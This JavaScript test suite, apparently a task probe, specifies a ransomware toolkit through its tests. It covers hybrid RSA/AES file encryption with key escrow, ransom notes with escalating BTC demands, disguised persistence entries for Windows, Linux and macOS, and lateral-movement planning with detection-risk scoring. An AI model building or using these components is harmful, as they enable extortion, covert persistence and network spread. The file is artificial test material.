export async function runRansomwareSimProbes({call, test, eq}) {
  // === Hybrid RSA+AES encryption engine ===

  await test('generateKeyPair returns valid RSA-2048 PEM pair', async () => {
    const kp = await call('src/encryptor.mjs', 'generateKeyPair', []);
    eq(typeof kp.publicKey, 'string');
    eq(typeof kp.privateKey, 'string');
    eq(kp.publicKey.includes('BEGIN RSA PUBLIC KEY'), true);
    eq(kp.privateKey.includes('BEGIN RSA PRIVATE KEY'), true);
  });

  await test('encryptFile + decryptFile roundtrip (short data)', async () => {
    const kp = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const plaintext = 'Hello ransomware simulation!';
    const bundle = await call('src/encryptor.mjs', 'encryptFile', [plaintext, kp.publicKey]);
    eq(typeof bundle.encrypted, 'string');
    eq(typeof bundle.iv, 'string');
    eq(typeof bundle.tag, 'string');
    eq(typeof bundle.encryptedKey, 'string');
    // IV should be 12 bytes = 24 hex chars
    eq(bundle.iv.length, 24);
    // Auth tag should be 16 bytes = 32 hex chars
    eq(bundle.tag.length, 32);

    const decrypted = await call('src/encryptor.mjs', 'decryptFile', [bundle, kp.privateKey]);
    // decryptFile returns a Buffer which serializes as {type:'Buffer', data:[...]}
    const recovered = Buffer.from(decrypted.data || decrypted).toString();
    eq(recovered, plaintext);
  });

  await test('encryptFile + decryptFile roundtrip (large data)', async () => {
    const kp = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const plaintext = 'A'.repeat(10000);
    const bundle = await call('src/encryptor.mjs', 'encryptFile', [plaintext, kp.publicKey]);
    const decrypted = await call('src/encryptor.mjs', 'decryptFile', [bundle, kp.privateKey]);
    const recovered = Buffer.from(decrypted.data || decrypted).toString();
    eq(recovered, plaintext);
  });

  await test('decryptFile with wrong private key throws', async () => {
    const kp1 = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const kp2 = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const bundle = await call('src/encryptor.mjs', 'encryptFile', ['secret data', kp1.publicKey]);
    let threw = false;
    try { await call('src/encryptor.mjs', 'decryptFile', [bundle, kp2.privateKey]); } catch { threw = true; }
    if (!threw) throw new Error('Expected decryptFile to throw with wrong private key');
  });

  await test('decryptFile with tampered ciphertext throws', async () => {
    const kp = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const bundle = await call('src/encryptor.mjs', 'encryptFile', ['important data', kp.publicKey]);
    const tampered = {...bundle, encrypted: 'ff' + bundle.encrypted.slice(2)};
    let threw = false;
    try { await call('src/encryptor.mjs', 'decryptFile', [tampered, kp.privateKey]); } catch { threw = true; }
    if (!threw) throw new Error('Expected decryptFile to throw with tampered ciphertext (GCM auth should fail)');
  });

  await test('escrowKey + recovery roundtrip', async () => {
    const victim = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const master = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const escrowed = await call('src/encryptor.mjs', 'escrowKey', [victim.privateKey, master.publicKey]);
    eq(typeof escrowed, 'string');
    // Escrowed should be base64 and different from plain base64 of the key
    if (escrowed === Buffer.from(victim.privateKey).toString('base64')) {
      throw new Error('escrowKey must RSA-encrypt, not just base64-encode');
    }
  });

  await test('Different encryptFile calls produce different ciphertext', async () => {
    const kp = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const b1 = await call('src/encryptor.mjs', 'encryptFile', ['same data', kp.publicKey]);
    const b2 = await call('src/encryptor.mjs', 'encryptFile', ['same data', kp.publicKey]);
    if (b1.iv === b2.iv) throw new Error('IV must be random — two encryptions of same data produced same IV');
    if (b1.encrypted === b2.encrypted) throw new Error('Ciphertext must differ due to random IV');
  });

  await test('encryptFile bundle has RSA-encrypted key (not plaintext)', async () => {
    const kp = await call('src/encryptor.mjs', 'generateKeyPair', []);
    const bundle = await call('src/encryptor.mjs', 'encryptFile', ['test', kp.publicKey]);
    // RSA-2048 OAEP encrypted output is 256 bytes = 344 base64 chars (with padding)
    const encKeyBytes = Buffer.from(bundle.encryptedKey, 'base64');
    eq(encKeyBytes.length, 256);
  });

  // === Ransom note generator ===

  await test('generateNote includes all required fields', async () => {
    const note = await call('src/ransom.mjs', 'generateNote', ['VICTIM-42', {
      amount: 2.5, currency: 'BTC', deadline: 1700000000000,
      addresses: ['bc1qaddr1', 'bc1qaddr2', 'bc1qaddr3'], escalationRate: 2.0
    }]);
    eq(typeof note, 'string');
    if (!note.includes('VICTIM-42')) throw new Error('Note must contain victimId');
    if (!note.includes('2.5 BTC')) throw new Error('Note must contain amount and currency');
    if (!note.includes('=== RANSOM NOTE ===')) throw new Error('Note must start with header');
    if (!note.includes('=== END NOTE ===')) throw new Error('Note must end with footer');
    if (!note.includes('Deadline:')) throw new Error('Note must contain deadline');
    if (!note.includes('After deadline: 5 BTC')) throw new Error('Note must show escalated amount');
  });

  await test('generateNote uses rotateAddress for payment address', async () => {
    const addresses = ['bc1qaaa', 'bc1qbbb', 'bc1qccc'];
    const note = await call('src/ransom.mjs', 'generateNote', ['test-victim', {
      amount: 1, deadline: 1700000000000, addresses
    }]);
    const addr = await call('src/ransom.mjs', 'rotateAddress', [addresses, 'test-victim', 0]);
    if (!note.includes(addr)) throw new Error('Note must use rotateAddress to select payment address');
  });

  await test('rotateAddress is deterministic', async () => {
    const addrs = ['addr1', 'addr2', 'addr3', 'addr4', 'addr5'];
    const a1 = await call('src/ransom.mjs', 'rotateAddress', [addrs, 'victim-X', 0]);
    const a2 = await call('src/ransom.mjs', 'rotateAddress', [addrs, 'victim-X', 0]);
    eq(a1, a2);
  });

  await test('rotateAddress distributes across addresses', async () => {
    const addrs = ['a', 'b', 'c', 'd'];
    const seen = new Set();
    for (let round = 0; round < 20; round++) {
      const addr = await call('src/ransom.mjs', 'rotateAddress', [addrs, 'spread-test', round]);
      seen.add(addr);
    }
    if (seen.size < 2) throw new Error('rotateAddress should distribute across multiple addresses over different rounds');
  });

  await test('verifyPayment accepts valid payment', async () => {
    const result = await call('src/ransom.mjs', 'verifyPayment', [
      {amount: 2.5, confirmations: 6, txHash: 'abc123'},
      {amount: 2.5, minConfirmations: 6}
    ]);
    eq(result, {verified: true, reason: null});
  });

  await test('verifyPayment rejects insufficient amount', async () => {
    const result = await call('src/ransom.mjs', 'verifyPayment', [
      {amount: 1.0, confirmations: 10, txHash: 'abc'},
      {amount: 2.5, minConfirmations: 6}
    ]);
    eq(result.verified, false);
    eq(result.reason, 'insufficient_amount');
  });

  await test('verifyPayment rejects insufficient confirmations', async () => {
    const result = await call('src/ransom.mjs', 'verifyPayment', [
      {amount: 5.0, confirmations: 3, txHash: 'abc'},
      {amount: 2.5, minConfirmations: 6}
    ]);
    eq(result.verified, false);
    eq(result.reason, 'insufficient_confirmations');
  });

  await test('computeDeadline returns correct deadline and escalation schedule', async () => {
    const result = await call('src/ransom.mjs', 'computeDeadline', [1000000, 24, {escalationRate: 1.5, maxEscalations: 3}]);
    const hourMs = 24 * 3600000;
    eq(result.deadline, 1000000 + hourMs);
    eq(result.escalations.length, 3);
    eq(result.escalations[0].time, 1000000 + hourMs);
    eq(result.escalations[0].multiplier, 1);
    eq(result.escalations[1].time, 1000000 + hourMs * 2);
    eq(result.escalations[1].multiplier, 1.5);
    eq(result.escalations[2].time, 1000000 + hourMs * 3);
    eq(result.escalations[2].multiplier, 1.5 * 1.5);
  });

  // === Persistence mechanism generator ===

  await test('generateRegistryPayload correct structure', async () => {
    const payload = await call('src/persist.mjs', 'generateRegistryPayload', ['C:\\\\malware.exe']);
    eq(payload.type, 'registry');
    eq(payload.value, 'C:\\\\malware.exe');
    eq(payload.valueName, 'SystemUpdate');
    eq(payload.key, 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run');
    eq(payload.hidden, false);
  });

  await test('generateRegistryPayload hidden flag', async () => {
    const payload = await call('src/persist.mjs', 'generateRegistryPayload', ['C:\\\\svc.exe', {hidden: true, valueName: 'WinSvc'}]);
    eq(payload.hidden, true);
    eq(payload.valueName, 'WinSvc');
  });

  await test('generateCronPayload with custom schedule and user', async () => {
    const payload = await call('src/persist.mjs', 'generateCronPayload', ['/usr/bin/backdoor', {schedule: '*/5 * * * *', user: 'www-data'}]);
    eq(payload.type, 'cron');
    eq(payload.command, '/usr/bin/backdoor');
    eq(payload.schedule, '*/5 * * * *');
    eq(payload.user, 'www-data');
    eq(payload.entry, '*/5 * * * * www-data /usr/bin/backdoor');
  });

  await test('generateLaunchdPayload with plist structure', async () => {
    const payload = await call('src/persist.mjs', 'generateLaunchdPayload', ['/usr/local/bin/agent', {label: 'com.evil.agent', keepAlive: true}]);
    eq(payload.type, 'launchd');
    eq(payload.label, 'com.evil.agent');
    eq(payload.plist.Label, 'com.evil.agent');
    eq(payload.plist.ProgramArguments, ['/usr/local/bin/agent']);
    eq(payload.plist.RunAtLoad, true);
    eq(payload.plist.KeepAlive, true);
  });

  await test('selectPersistence windows/admin → service', async () => {
    eq(await call('src/persist.mjs', 'selectPersistence', ['windows', 'admin']),
      {mechanism: 'service', description: 'Windows service installation'});
  });

  await test('selectPersistence windows/user → registry', async () => {
    eq(await call('src/persist.mjs', 'selectPersistence', ['windows', 'user']),
      {mechanism: 'registry', description: 'Run key persistence'});
  });

  await test('selectPersistence linux/admin → systemd', async () => {
    eq(await call('src/persist.mjs', 'selectPersistence', ['linux', 'admin']),
      {mechanism: 'systemd', description: 'Systemd service unit'});
  });

  await test('selectPersistence linux/user → cron', async () => {
    eq(await call('src/persist.mjs', 'selectPersistence', ['linux', 'user']),
      {mechanism: 'cron', description: 'User crontab entry'});
  });

  await test('selectPersistence macos/user → launchd-agent', async () => {
    eq(await call('src/persist.mjs', 'selectPersistence', ['macos', 'user']),
      {mechanism: 'launchd-agent', description: 'LaunchAgent plist'});
  });

  await test('selectPersistence macos/admin → launchd-daemon', async () => {
    eq(await call('src/persist.mjs', 'selectPersistence', ['macos', 'admin']),
      {mechanism: 'launchd-daemon', description: 'LaunchDaemon plist'});
  });

  await test('selectPersistence rejects invalid OS or privileges', async () => {
    for (const args of [['bsd', 'admin'], ['windows', 'guest'], ['', 'admin']]) {
      let threw = false;
      try { await call('src/persist.mjs', 'selectPersistence', args); } catch { threw = true; }
      if (!threw) throw new Error('Expected rejection for invalid args: ' + JSON.stringify(args));
    }
  });

  // === Network propagation planner ===

  const hosts = [
    {id: 'web', os: 'linux', services: ['http', 'ssh']},
    {id: 'db', os: 'linux', services: ['mysql']},
    {id: 'dc', os: 'windows', services: ['ldap', 'smb']},
    {id: 'isolated', os: 'linux', services: ['ssh']}
  ];
  const connections = [
    {from: 'web', to: 'db', protocol: 'tcp'},
    {from: 'web', to: 'dc', protocol: 'tcp'},
    {from: 'db', to: 'dc', protocol: 'tcp'}
  ];

  await test('buildNetworkGraph creates correct adjacency', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    eq(graph.nodes.web.id, 'web');
    eq(graph.nodes.db.os, 'linux');
    eq(graph.nodes.dc.services.length, 2);
    // web should have edges to db and dc
    const webEdges = graph.edges.web;
    eq(webEdges.length, 2);
    const webTargets = webEdges.map(e => e.target).sort();
    eq(webTargets, ['db', 'dc']);
  });

  await test('buildNetworkGraph bidirectional edges', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    // db→web should exist (reverse of web→db)
    const dbEdges = graph.edges.db;
    const dbTargets = dbEdges.map(e => e.target).sort();
    eq(dbTargets, ['dc', 'web']);
    // isolated should have empty edges
    eq(graph.edges.isolated.length, 0);
  });

  await test('buildNetworkGraph rejects invalid connection endpoints', async () => {
    let threw = false;
    try {
      await call('src/propagator.mjs', 'buildNetworkGraph', [
        [{id: 'a', os: 'linux', services: []}],
        [{from: 'a', to: 'nonexistent', protocol: 'tcp'}]
      ]);
    } catch { threw = true; }
    if (!threw) throw new Error('Expected rejection for connection to nonexistent host');
  });

  await test('findPropagationPath finds shortest path', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    // web→dc is direct (1 hop)
    const result = await call('src/propagator.mjs', 'findPropagationPath', [graph, 'web', 'dc']);
    eq(result.path, ['web', 'dc']);
    eq(result.hops, 1);
  });

  await test('findPropagationPath returns null for unreachable', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    const result = await call('src/propagator.mjs', 'findPropagationPath', [graph, 'web', 'isolated']);
    eq(result.path, null);
    eq(result.hops, -1);
  });

  await test('findPropagationPath source==target → 0 hops', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    const result = await call('src/propagator.mjs', 'findPropagationPath', [graph, 'web', 'web']);
    eq(result.path, ['web']);
    eq(result.hops, 0);
  });

  await test('planLateralMovement from compromised node', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    const plan = await call('src/propagator.mjs', 'planLateralMovement', [graph, ['web'], {maxHops: 3}]);
    // From web: db (1 hop) and dc (1 hop) are reachable. Isolated is not.
    eq(plan.totalReachable, 2);
    const targetIds = plan.targets.map(t => t.id).sort();
    eq(targetIds, ['db', 'dc']);
    for (const t of plan.targets) {
      eq(t.hops, 1);
      eq(typeof t.risk, 'number');
    }
  });

  await test('planLateralMovement respects maxHops', async () => {
    // Linear chain: a→b→c→d
    const linearHosts = [
      {id: 'a', os: 'linux', services: ['ssh']},
      {id: 'b', os: 'linux', services: ['ssh']},
      {id: 'c', os: 'linux', services: ['ssh']},
      {id: 'd', os: 'linux', services: ['ssh']}
    ];
    const linearConns = [
      {from: 'a', to: 'b', protocol: 'tcp'},
      {from: 'b', to: 'c', protocol: 'tcp'},
      {from: 'c', to: 'd', protocol: 'tcp'}
    ];
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [linearHosts, linearConns]);
    const plan1 = await call('src/propagator.mjs', 'planLateralMovement', [graph, ['a'], {maxHops: 1}]);
    eq(plan1.totalReachable, 1); // only b at 1 hop
    const plan2 = await call('src/propagator.mjs', 'planLateralMovement', [graph, ['a'], {maxHops: 2}]);
    eq(plan2.totalReachable, 2); // b and c
    const plan3 = await call('src/propagator.mjs', 'planLateralMovement', [graph, ['a'], {maxHops: 3}]);
    eq(plan3.totalReachable, 3); // b, c, d
  });

  await test('estimateDetectionRisk with no defenses → low risk', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    const plan = await call('src/propagator.mjs', 'planLateralMovement', [graph, ['web'], {maxHops: 1}]);
    const risk = await call('src/propagator.mjs', 'estimateDetectionRisk', [plan, {}]);
    // Base 0.1 + 2 targets * 1 hop * 0.05 = 0.2
    eq(risk.risk, 0.2);
    eq(risk.factors, []);
  });

  await test('estimateDetectionRisk with IDS+SIEM+EDR → high risk', async () => {
    const graph = await call('src/propagator.mjs', 'buildNetworkGraph', [hosts, connections]);
    const plan = await call('src/propagator.mjs', 'planLateralMovement', [graph, ['web'], {maxHops: 1}]);
    const risk = await call('src/propagator.mjs', 'estimateDetectionRisk', [plan, {hasIDS: true, hasSIEM: true, hasEDR: true}]);
    // Base 0.1 + IDS 0.3 + SIEM 0.3 + EDR 0.2 + 2*1*0.05 = 1.0 (capped)
    eq(risk.risk, 1.0);
    eq(risk.factors.sort(), ['EDR', 'IDS', 'SIEM']);
  });
}
